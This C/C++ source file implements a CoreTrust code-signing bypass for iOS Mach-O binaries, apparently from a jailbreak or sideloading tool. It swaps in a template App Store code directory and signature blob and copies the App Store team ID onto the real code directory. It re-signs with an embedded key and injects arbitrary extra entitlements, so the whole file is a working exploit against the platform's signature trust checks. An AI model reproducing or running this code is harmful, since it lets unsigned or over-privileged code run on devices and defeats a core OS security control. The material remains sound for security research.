#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <libgen.h>


#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iostream>
#include <memory>
#include <set>
#include <sstream>
#include <string>
#include <vector>
#include <plist/plist.h>


enum SecCodeExecSegFlags {
    kSecCodeExecSegMainBinary = 0x001,
    kSecCodeExecSegAllowUnsigned = 0x010,
    kSecCodeExecSegDebugger = 0x020,
    kSecCodeExecSegJit = 0x040,
    kSecCodeExecSegSkipLibraryVal = 0x080,
    kSecCodeExecSegCanLoadCdHash = 0x100,
    kSecCodeExecSegCanExecCdHash = 0x100,
};


#define _assert___(line) \
    #line
#define _assert__(line) \
    _assert___(line)

#ifndef $
#define $(value) value
#endif

#ifdef __EXCEPTIONS
#define _assert_(expr, format, ...) \
    do if (!(expr)) { \
        fprintf(stderr, $("%s(%u): _assert(): " format "\n"), __FILE__, __LINE__, ## __VA_ARGS__); \
        throw $(__FILE__ "(" _assert__(__LINE__) "): _assert(" #expr ")"); \
    } while (false)
#else
// XXX: this is not acceptable
#define _assert_(expr, format, ...) \
    do if (!(expr)) { \
        fprintf(stderr, $("%s(%u): _assert(): " format "\n"), __FILE__, __LINE__, ## __VA_ARGS__); \
        exit(-1); \
    } while (false)
#endif

#define _assert(expr) \
    _assert_(expr, "%s", $(#expr))

class _Scope {
};

template <typename Function_>
class Scope :
    public _Scope
{
  private:
    Function_ function_;

  public:
    Scope(const Function_ &function) :
        function_(function)
    {
    }

    ~Scope() {
        function_();
    }
};

template <typename Function_>
Scope<Function_> _scope(const Function_ &function) {
    return Scope<Function_>(function);
}

#define _scope__(counter, function) \
    __attribute__((__unused__)) \
    const _Scope &_scope ## counter(_scope([&]function))
#define _scope_(counter, function) \
    _scope__(counter, function)
#define _scope(function) \
    _scope_(__COUNTER__, function)

static inline void put(std::streambuf &stream, uint8_t value) {
    _assert(stream.sputc(value) != EOF);
}

static inline void put(std::streambuf &stream, const void *data, size_t size) {
    _assert(stream.sputn(static_cast<const char *>(data), size) == size);
}

static inline void put(std::streambuf &stream, const std::string &data) {
    return put(stream, data.data(), data.size());
}

template <typename Type_>
Type_ Align(Type_ value, size_t align) {
    value += align - 1;
    value /= align;
    value *= align;
    return value;
}

static const uint8_t PageShift_(0x0c);
static const uint32_t PageSize_(1 << PageShift_);

static inline unsigned bytes(uint64_t value) {
    if (!value) return 1;
    return (64 - __builtin_clzll(value) + 7) / 8;
}

static void put(std::streambuf &stream, uint64_t value, size_t length) {
    length *= 8;
    do put(stream, uint8_t(value >> (length -= 8)));
    while (length != 0);
}

static void der(std::streambuf &stream, uint64_t value) {
    if (value < 128)
        put(stream, value);
    else {
        unsigned length(bytes(value));
        put(stream, 0x80 | length);
        put(stream, value, length);
    }
}

static std::string der(uint8_t tag, const char *value, size_t length) {
    std::stringbuf data;
    put(data, tag);
    der(data, length);
    put(data, value, length);
    return data.str();
}

static std::string der(uint8_t tag, const char *value) {
    return der(tag, value, strlen(value)); }
static std::string der(uint8_t tag, const std::string &value) {
    return der(tag, value.data(), value.size()); }

template <typename Type_>
static void der_(std::stringbuf &data, const Type_ &values) {
    size_t size(0);
    for (const auto &value : values)
        size += value.size();
    der(data, size);
    for (const auto &value : values)
        put(data, value);
}

static std::string der(const std::vector<std::string> &values) {
    std::stringbuf data;
    put(data, 0x30);
    der_(data, values);
    return data.str();
}

static std::string der(const std::multiset<std::string> &values) {
    std::stringbuf data;
    put(data, 0x31);
    der_(data, values);
    return data.str();
}

static std::string der(const std::pair<std::string, std::string> &value) {
    const auto key(der(0x0c, value.first));
    std::stringbuf data;
    put(data, 0x30);
    der(data, key.size() + value.second.size());
    put(data, key);
    put(data, value.second);
    return data.str();
}

static std::string der(plist_t data) {
    switch (const auto type = plist_get_node_type(data)) {
        case PLIST_BOOLEAN: {
            uint8_t value(0);
            plist_get_bool_val(data, &value);

            std::stringbuf data;
            put(data, 0x01);
            der(data, 1);
            put(data, value != 0 ? 1 : 0);
            return data.str();
        } break;

        case PLIST_UINT: {
            uint64_t value;
            plist_get_uint_val(data, &value);
            const auto length(bytes(value));

            std::stringbuf data;
            put(data, 0x02);
            der(data, length);
            put(data, value, length);
            return data.str();
        } break;

        case PLIST_REAL: {
            fprintf(stderr, "ldid: Invalid plist entry type\n");
            exit(1);
        } break;

        case PLIST_DATE: {
            fprintf(stderr, "ldid: Invalid plist entry type\n");
            exit(1);
        } break;

        case PLIST_DATA: {
            char *value;
            uint64_t length;
            plist_get_data_val(data, &value, &length);
            _scope({ free(value); });
            return der(0x04, value, length);
        } break;

        case PLIST_STRING: {
            char *value;
            plist_get_string_val(data, &value);
            _scope({ free(value); });
            return der(0x0c, value);
        } break;

        case PLIST_ARRAY: {
            std::vector<std::string> values;
            for (auto e(plist_array_get_size(data)), i(decltype(e)(0)); i != e; ++i)
                values.push_back(der(plist_array_get_item(data, i)));
            return der(values);
        } break;

        case PLIST_DICT: {
            std::multiset<std::string> values;

            plist_dict_iter iterator(NULL);
            plist_dict_new_iter(data, &iterator);
            _scope({ free(iterator); });

            for (;;) {
                char *key(NULL);
                plist_t value(NULL);
                plist_dict_next_item(data, iterator, &key, &value);
                if (key == NULL)
                    break;
                _scope({ free(key); });
                values.insert(der(std::make_pair(key, der(value))));
            }

            return der(values);
        } break;

        default: {
            fprintf(stderr, "ldid: Unsupported plist type %d", type);
            exit(1);
        } break;
    }
}


static bool Starts(const std::string &lhs, const std::string &rhs) {
    return lhs.size() >= rhs.size() && lhs.compare(0, rhs.size(), rhs) == 0;
}

static plist_t plist(const std::string &data) {
    if (data.empty())
        return plist_new_dict();
    plist_t plist(NULL);
    if (Starts(data, "bplist00"))
        plist_from_bin(data.data(), data.size(), &plist);
    else
        plist_from_xml(data.data(), data.size(), &plist);
    if (plist == NULL) {
        fprintf(stderr, "ldid: Failed to parse plist\n");
        exit(1);
    }
    return plist;
}





extern "C" {
#include <choma/CSBlob.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/SignOSSL.h>
#include <choma/CodeDirectory.h>
#include <choma/Base64.h>
#include "Templates/AppStoreCodeDirectory.h"
#include "Templates/SignatureBlob.h"
#include "Templates/DecryptedSignature.h"
#include "Templates/PrivateKey.h"

// We can use static offsets here because we use a template signature blob
#define SIGNED_ATTRS_OFFSET 0x13C6 // SignedAttributes sequence
#define HASHHASH_OFFSET 0x1470 // SHA256 hash SignedAttribute
#define BASEBASE_OFFSET 0x15AD // Base64 hash SignedAttribute
#define SIGNSIGN_OFFSET 0x1602 // Signature

#define DECRYPTED_SIGNATURE_HASH_OFFSET 0x13

int update_signature_blob(CS_DecodedSuperBlob *superblob)
{
    CS_DecodedBlob *sha256CD = csd_superblob_find_blob(superblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
    if (!sha256CD) {
        printf("Could not find CodeDirectory blob!\n");
        return -1;
    }
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
    if (!signatureBlob) {
        printf("Could not find signature blob!\n");
        return -1;
    }

    uint8_t fullHash[CC_SHA256_DIGEST_LENGTH];
    size_t dataSizeToRead = csd_blob_get_size(sha256CD);
    uint8_t *data = (uint8_t*)malloc(dataSizeToRead);
    memset(data, 0, dataSizeToRead);
    csd_blob_read(sha256CD, 0, dataSizeToRead, data);
    CC_SHA256(data, (CC_LONG)dataSizeToRead, fullHash);
    free(data);
    uint8_t secondCDSHA256Hash[CC_SHA256_DIGEST_LENGTH];
    memcpy(secondCDSHA256Hash, fullHash, CC_SHA256_DIGEST_LENGTH);
    // Print the hash
    printf("SHA256 hash: ");
    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
        printf("%02x", secondCDSHA256Hash[i]);
    }
    printf("\n");

    size_t base64OutLength = 0;
    char *newBase64Hash = base64_encode(secondCDSHA256Hash, CC_SHA1_DIGEST_LENGTH, &base64OutLength);
    if (!newBase64Hash) {
        printf("Failed to base64 encode hash!\n");
        return -1;
    }

    // Print the base64 hash
    printf("Base64 hash: %.*s\n", CC_SHA256_DIGEST_LENGTH, newBase64Hash);

    int ret = csd_blob_write(signatureBlob, HASHHASH_OFFSET, CC_SHA256_DIGEST_LENGTH, secondCDSHA256Hash);
    if (ret != 0) {
        printf("Failed to write SHA256 hash to signature blob!\n");
        free(newBase64Hash);
        return -1;
    }
    
    ret = csd_blob_write(signatureBlob, BASEBASE_OFFSET, base64OutLength, newBase64Hash);
    if (ret != 0) {
        printf("Failed to write base64 hash to signature blob!\n");
        free(newBase64Hash);
        return -1;
    }

    free(newBase64Hash);

    unsigned char *newSignature = NULL;
    size_t newSignatureSize = 0;

    unsigned char newDecryptedSignature[0x33];
    memset(newDecryptedSignature, 0, 0x33);
    memcpy(newDecryptedSignature, DecryptedSignature, 0x33);

    // Get the signed attributes hash
    unsigned char signedAttrs[0x229];
    memset(signedAttrs, 0, 0x229);
    csd_blob_read(signatureBlob, SIGNED_ATTRS_OFFSET, 0x229, signedAttrs);
    signedAttrs[0] = 0x31;
    
    // Hash
    uint8_t fullAttributesHash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(signedAttrs, (CC_LONG)0x229, fullAttributesHash);
    memcpy(newDecryptedSignature + DECRYPTED_SIGNATURE_HASH_OFFSET, fullAttributesHash, CC_SHA256_DIGEST_LENGTH);

    newSignature = signWithRSA(newDecryptedSignature, DecryptedSignature_len, CAKey, CAKeyLength, &newSignatureSize);

    if (!newSignature) {
        printf("Failed to sign the decrypted signature!\n");
        return -1;
    }

    if (newSignatureSize != 0x100) {
        printf("The new signature is not the correct size!\n");
        free(newSignature);
        return -1;
    }

    ret = csd_blob_write(signatureBlob, SIGNSIGN_OFFSET, newSignatureSize, newSignature);
    free(newSignature);
    return ret;
}

uint32_t magicTable[] = {
    CSMAGIC_CODEDIRECTORY,
    0,
    CSMAGIC_REQUIREMENT,
    0,
    0,
    CSMAGIC_EMBEDDED_ENTITLEMENTS,
    0,
    CSMAGIC_EMBEDDED_DER_ENTITLEMENTS
};

int reset_blob(CS_DecodedSuperBlob *decodedSuperblob, CS_DecodedBlob *realCodeDirBlob, uint32_t type, void* data, int size)
{
    CS_CodeDirectory realCodeDir;
    csd_blob_read(realCodeDirBlob, 0, sizeof(realCodeDir), &realCodeDir);
    CODE_DIRECTORY_APPLY_BYTE_ORDER(&realCodeDir, HOST_TO_BIG_APPLIER);

    CS_DecodedBlob *blob = csd_superblob_find_blob(decodedSuperblob, type, NULL);
    if(!blob) {
        assert(type < (sizeof(magicTable)/sizeof(magicTable[0])));
        assert(magicTable[type] != 0);

        uint32_t magic = magicTable[type];
        uint32_t length = sizeof(CS_GenericBlob);
        CS_GenericBlob genblob = {HOST_TO_BIG(magic), HOST_TO_BIG(length)};
        blob = csd_blob_init(type, &genblob);

        //work, append to CSSLOT_ENTITLEMENTS
        // CS_DecodedBlob *entblob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS, NULL);
        // csd_superblob_insert_blob_after_blob(decodedSuperblob, blob, entblob);

        //work, as last blob
        // csd_superblob_append_blob(decodedSuperblob, blob);

        //work, as the first blob
        csd_superblob_insert_blob_at_index(decodedSuperblob, blob, 0);


        if(realCodeDir.nSpecialSlots < type) {
            uint8_t hash[realCodeDir.hashSize];
            memset(hash, 0, realCodeDir.hashSize);
            for(int i=realCodeDir.nSpecialSlots; i<type; i++)
                assert(csd_blob_insert(realCodeDirBlob, realCodeDir.hashOffset - i*sizeof(hash), sizeof(hash), hash) == 0);

            realCodeDir.hashOffset += sizeof(hash) * (type - realCodeDir.nSpecialSlots);
            realCodeDir.nSpecialSlots = type;

            uint32_t newHashOffset = HOST_TO_BIG(realCodeDir.hashOffset);
            csd_blob_write(realCodeDirBlob, offsetof(CS_CodeDirectory,hashOffset), sizeof(newHashOffset), &newHashOffset);
            uint32_t newSpecialSlots = HOST_TO_BIG(realCodeDir.nSpecialSlots);
            csd_blob_write(realCodeDirBlob, offsetof(CS_CodeDirectory,nSpecialSlots), sizeof(newSpecialSlots), &newSpecialSlots);

            //update other offsets in CodeDir?
        }
    }

    csd_blob_write(blob, offsetof(CS_GenericBlob,data), size, data);

    int blobsize = csd_blob_get_size(blob);
    CS_GenericBlob* genblob = (CS_GenericBlob*)malloc(blobsize);
    memset(genblob, 0, blobsize);
    memory_stream_read(blob->stream, 0, blobsize, genblob);

    void* hashdata = genblob;
    int hashsize = blobsize;

    bool calcWorked = false;

    uint8_t hash[realCodeDir.hashSize];
    switch (realCodeDir.hashType) {
        case CS_HASHTYPE_SHA160_160: {
            CC_SHA1(hashdata, (CC_LONG)hashsize, hash);
            calcWorked = true;
            break;
        }

        case CS_HASHTYPE_SHA256_256:
        case CS_HASHTYPE_SHA256_160: {
            uint8_t fullHash[CC_SHA256_DIGEST_LENGTH];
            CC_SHA256(hashdata, (CC_LONG)hashsize, fullHash);
            memcpy(hash, fullHash, realCodeDir.hashSize);
            calcWorked = true;
            break;
        }

        case CS_HASHTYPE_SHA384_384: {
            uint8_t fullHash[CC_SHA384_DIGEST_LENGTH];
            CC_SHA256(hashdata, (CC_LONG)hashsize, fullHash);
            memcpy(hash, fullHash, realCodeDir.hashSize);
            calcWorked = true;
            break;
        }
    }

    free(genblob);
    genblob = NULL;


    assert(calcWorked==true);

    int slot = - type;
    csd_blob_write(realCodeDirBlob, realCodeDir.hashOffset + (slot * realCodeDir.hashSize), realCodeDir.hashSize, hash);

    return 0;
}

int apply_coretrust_bypass(const char *machoPath, const char* extraEntitlements, const char* strip_entitlements)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
    free(superblob);

    CS_DecodedBlob *realCodeDirBlob = NULL;
    CS_DecodedBlob *mainCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    CS_DecodedBlob *alternateCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);

    if (!mainCodeDirBlob) {
        printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed?\n");
        return -1;
    }

    // We need to determine which code directory to transfer to the new binary
    if (alternateCodeDirBlob) {
        // If an alternate code directory exists, use that and remove the main one from the superblob
        realCodeDirBlob = alternateCodeDirBlob;
        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirBlob);
        csd_blob_free(mainCodeDirBlob);
    }
    else {
        // Otherwise use the main code directory
        realCodeDirBlob = mainCodeDirBlob;
    }

    if (csd_code_directory_get_hash_type(realCodeDirBlob) != CS_HASHTYPE_SHA256_256) {
        printf("Error: Alternate code directory is not SHA256, bypass won't work!\n");
        return -1;
    }

    printf("Applying App Store code directory...\n");

    // Append real code directory as alternateCodeDirectory at the end of superblob
    csd_superblob_remove_blob(decodedSuperblob, realCodeDirBlob);
    csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);

    // Insert AppStore code directory as main code directory at the start
    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
    csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);

    printf("Adding new signature blob...\n");
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (signatureBlob) {
        // Remove existing signatureBlob if existant
        csd_superblob_remove_blob(decodedSuperblob, signatureBlob);
        csd_blob_free(signatureBlob);
    }

    // Append new template blob
    signatureBlob = csd_blob_init(CSSLOT_SIGNATURESLOT, (CS_GenericBlob *)TemplateSignatureBlob);
    csd_superblob_append_blob(decodedSuperblob, signatureBlob);

    // After Modification:
    // 1. App Store CodeDirectory (SHA1)
    // ?. Requirements
    // ?. Entitlements
    // ?. DER entitlements
    // 5. Actual CodeDirectory (SHA256)
    // 6. Signature blob

    printf("Updating TeamID...\n");

    // Get team ID from AppStore code directory
    // For the bypass to work, both code directories need to have the same team ID
    char *appStoreTeamID = csd_code_directory_copy_team_id(appStoreCodeDirectoryBlob, NULL);
    if (!appStoreTeamID) {
        printf("Error: Unable to determine AppStore Team ID\n");
        return -1;
    }

    // Set the team ID of the real code directory to the AppStore one
    if (csd_code_directory_set_team_id(realCodeDirBlob, appStoreTeamID) != 0) {
        printf("Error: Failed to set Team ID\n");
        return -1;
    }

    printf("TeamID set to %s!\n", appStoreTeamID);
    free(appStoreTeamID);

    // Set flags to 0 to remove any problematic flags (such as the 'adhoc' flag in bit 2)
    csd_code_directory_set_flags(realCodeDirBlob, 0);


    CS_DecodedBlob *entBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS, NULL);
    CS_DecodedBlob *derBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS, NULL);
    
    //some library may miss entitlement or der-entitlement, so mismatch with the fake MainCD
    if(macho->machHeader.filetype != MH_EXECUTE) 
    {
        CS_CodeDirectory realCodeDir;
        csd_blob_read(realCodeDirBlob, 0, sizeof(realCodeDir), &realCodeDir);
        CODE_DIRECTORY_APPLY_BYTE_ORDER(&realCodeDir, HOST_TO_BIG_APPLIER);

        if(entBlob && !derBlob) {
            //work, remove blob and empty the slot hash
            uint8_t hash[realCodeDir.hashSize];
            memset(hash, 0, realCodeDir.hashSize);
            assert(csd_blob_write(realCodeDirBlob, realCodeDir.hashOffset - CSSLOT_ENTITLEMENTS*sizeof(hash), sizeof(hash), hash) == 0);
            assert(csd_superblob_remove_blob(decodedSuperblob, entBlob) == 0);
        }

        if(derBlob && !entBlob) {
            //work?
            uint8_t hash[realCodeDir.hashSize];
            memset(hash, 0, realCodeDir.hashSize);
            assert(csd_blob_write(realCodeDirBlob, realCodeDir.hashOffset - CSSLOT_DER_ENTITLEMENTS*sizeof(hash), sizeof(hash), hash) == 0);
            assert(csd_superblob_remove_blob(decodedSuperblob, derBlob) == 0);
        }

        //work, but may missing some slots
        // realCodeDir.nSpecialSlots -= 1;
        // uint32_t newSpecialSlots = HOST_TO_BIG(realCodeDir.nSpecialSlots);
        // csd_blob_write(realCodeDirBlob, offsetof(CS_CodeDirectory,nSpecialSlots), sizeof(newSpecialSlots), &newSpecialSlots);
    }
    
    if(macho->machHeader.filetype == MH_EXECUTE) 
    {
        struct Baton {
            std::string entitlements_;
            std::string derformat_;
        } baton;

        std::string entitlements_;

        if(entBlob) {

            int blobsize = csd_blob_get_size(entBlob);
            CS_GenericBlob* blob = (CS_GenericBlob*)malloc(blobsize);
            memset(blob, 0, blobsize);
            memory_stream_read(entBlob->stream, 0, blobsize, blob);

            entitlements_.assign(blob->data, blobsize-sizeof(CS_GenericBlob));

            free(blob);
        }

        auto combined = plist(entitlements_);

        _scope({ plist_free(combined); });
        if (plist_get_node_type(combined) != PLIST_DICT) {
            fprintf(stderr, "ldid: Existing entitlements are in wrong format\n");
            exit(1);
        };

        auto merging(plist(extraEntitlements));

        _scope({ plist_free(merging); });
        if (plist_get_node_type(merging) != PLIST_DICT) {
            fprintf(stderr, "ldid: Entitlements need a root key of dict\n");
            exit(1);
        };

        plist_dict_iter iterator(NULL);
        plist_dict_new_iter(merging, &iterator);
        _scope({ free(iterator); });

        for (;;) {
            char *key(NULL);
            plist_t value(NULL);
            plist_dict_next_item(merging, iterator, &key, &value);
            if (key == NULL)
                break;
            _scope({ free(key); });
            plist_dict_set_item(combined, key, plist_copy(value));
        }


        if(strip_entitlements) {
            auto strping(plist(strip_entitlements));
            for(int i=0; i<plist_array_get_size(strping); i++) {
                char *key(NULL);
                plist_get_string_val(plist_array_get_item(strping, i), &key);
                plist_dict_remove_item(combined, key);
            }
        }


        plist_dict_remove_item(combined, "com.apple.private.skip-library-validation");
        plist_dict_remove_item(combined, "com.apple.private.cs.debugger");
        plist_dict_remove_item(combined, "dynamic-codesigning");


        baton.derformat_ = der(combined);

        char *xml(NULL);
        uint32_t size;
        plist_to_xml(combined, &xml, &size);
        _scope({ free(xml); });

        baton.entitlements_.assign(xml, size);


        reset_blob(decodedSuperblob, realCodeDirBlob, CSSLOT_ENTITLEMENTS, (void*)baton.entitlements_.data(), baton.entitlements_.size());
        //have to update CodeDir...
        reset_blob(decodedSuperblob, realCodeDirBlob, CSSLOT_DER_ENTITLEMENTS, (void*)baton.derformat_.data(), baton.derformat_.size());
        //have to update CodeDir...
    
    }


    printf("Updating code slot hashes...\n");
    csd_code_directory_alloc(realCodeDirBlob, macho);

    printf("Encoding unsigned superblob...\n");
    CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);

    printf("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, originalCodeSignatureSize, memory_stream_get_size(macho->stream)) != 0) {
        printf("Error: failed to update load commands!\n");
        return -1;
    }
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    csd_code_directory_update(realCodeDirBlob, macho);

    int ret = 0;
    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding signed superblob...\n");
    CS_SuperBlob *newSuperblob = csd_superblob_encode(decodedSuperblob);

    printf("Writing superblob to MachO...\n");
    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    csd_superblob_free(decodedSuperblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}

#include <choma/FAT.h>
#include <choma/MachO.h>
#include <choma/FileStream.h>
#include <choma/Host.h>
#include <copyfile.h>

char *extract_preferred_slice(const char *fatPath)
{
    FAT *fat = fat_init_from_path(fatPath);
    if (!fat) return NULL;
    MachO *macho = fat_find_preferred_slice(fat);
    if (!macho) return NULL;
    
    char *temp = strdup("/tmp/XXXXXX");
    int fd = mkstemp(temp);

    MemoryStream *outStream = file_stream_init_from_path(temp, 0, 0, FILE_STREAM_FLAG_WRITABLE | FILE_STREAM_FLAG_AUTO_EXPAND);
    MemoryStream *machoStream = macho_get_stream(macho);
    memory_stream_copy_data(machoStream, 0, outStream, 0, memory_stream_get_size(machoStream));

    fat_free(fat);
    memory_stream_free(outStream);
    close(fd);
    return temp;
}


int realstore(const char* path, const char* extra_entitlements, const char* strip_entitlements)
{
    // printf("extra_entitlements: %s\n", extra_entitlements);
    char buf[PATH_MAX];
    const char *input = path;

    struct stat st;
    assert(stat(input, &st) == 0);

	char *machoPath = extract_preferred_slice(input);
    if(!machoPath) {
        printf("extracted failed %s\n", input);
        return -1;
    }
	printf("Extracted %s best slice to %s\n", basename_r(input, buf), machoPath);

    printf("Applying CoreTrust bypass...\n");

	if (apply_coretrust_bypass(machoPath, extra_entitlements, strip_entitlements) != 0) {
		printf("Failed applying CoreTrust bypass\n");
		return -1;
	}

   if (copyfile(machoPath, input, 0, COPYFILE_ALL | COPYFILE_MOVE | COPYFILE_UNLINK) == 0) {
        chown(input, st.st_uid, st.st_gid);
        chmod(input, st.st_mode);
        printf("Applied CoreTrust Bypass!\n");
    }
    else {
        perror("copyfile");
		return -1;
    }

	free(machoPath);
	return 0;
}


} // extern "C"
